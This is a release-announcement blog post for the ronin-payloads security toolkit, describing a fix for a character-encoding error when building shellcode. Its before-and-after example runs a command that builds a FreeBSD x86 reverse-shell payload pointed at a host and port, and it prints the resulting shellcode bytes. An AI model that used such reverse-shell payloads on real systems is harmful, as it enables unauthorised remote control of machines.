---
layout: post
title: ronin-payloads 0.1.6 and 0.2.0.rc2 released
author: postmodern
tags:
  - ronin-payloads
  - bugfixes
---

[ronin-payloads][ronin-payloads] [0.1.6][ronin-payloads-0.1.6] and
[0.2.0.rc2][ronin-payloads-0.2.0.rc2] have been released to fix an
`incompatible character encodings: UTF-8 and ASCII-8BIT` exceptions when
building shellcode payloads with certain IP addresses or port numbers. 

### Before

```
$ ronin-payloads build shellcode/freebsd/x86/reverse_shell -p host=192.168.1.1 -p port=1337 --format hex
ronin-payloads build: /usr/local/share/gems/gems/ronin-payloads-0.1.5/lib/ronin/payloads/builtin/shellcode/freebsd/x86/reverse_shell.rb:55:in `build': incompatible character encodings: UTF-8 and ASCII-8BIT (Encoding::CompatibilityError)
```

### After

After updating, all shellcode payloads should now build without any issues:

```
$ ronin-payloads build shellcode/freebsd/x86/reverse_shell -p host=192.168.1.1 -p port=1337 --format hex
1\xc0Pj\x01j\x02\xb0aP\xcd\x80\x89\xc2h\xc0\xa8\x01\x01fh\x059fh\x01\x02\x89\xe1j\x10QR1\xc0\xb0bP\xcd\x801\xc9QR1\xc0\xb0ZP\xcd\x80\xfe\xc1\x80\xf9\x03u\xf01\xc0Ph//shh/bin\x89\xe3PTS\xb0;P\xcd\x80
```

## How To Update

### Gems

To only update [ronin-payloads] to [0.1.6][ronin-payloads-0.1.6], simply run:

```shell
gem update ronin-payloads
```

If you are participating in the [Ronin 2.1.0 Open Beta], you can update to
[ronin-payloads][ronin-payloads] [0.2.0.rc2][ronin-payloads-0.2.0.rc2] by
running:

```shell
gem update ronin-payloads --pre
```

### Docker

{% include docker_update.md %}

If you are participating in the [Ronin 2.1.0 Open Beta], you can pull down the
updated `roninrb/ronin:2.1.0.rc1.2` docker image:

```shell
$ docker pull roninrb/ronin:2.1.0.rc1.2
$ docker run --rm -it roninrb/ronin:2.1.0.rc1.2
root@4dfc260a8be5:/# ronin-payloads -V
ronin-payloads 0.2.0.rc2
```

### Snap

{% include snap_update.md %}

[Ronin 2.1.0 Open Beta]: /blog/2024/06/24/announcing-the-ronin-2-1-0-open-beta.html

[ronin-payloads]: https://github.com/ronin-rb/ronin-payloads#readme
[ronin-payloads-0.1.6]: https://github.com/ronin-rb/ronin-payloads/releases/tag/v0.1.6
[ronin-payloads-0.2.0.rc2]: https://github.com/ronin-rb/ronin-payloads/compare/v0.2.0.rc1...v0.2.0.rc2
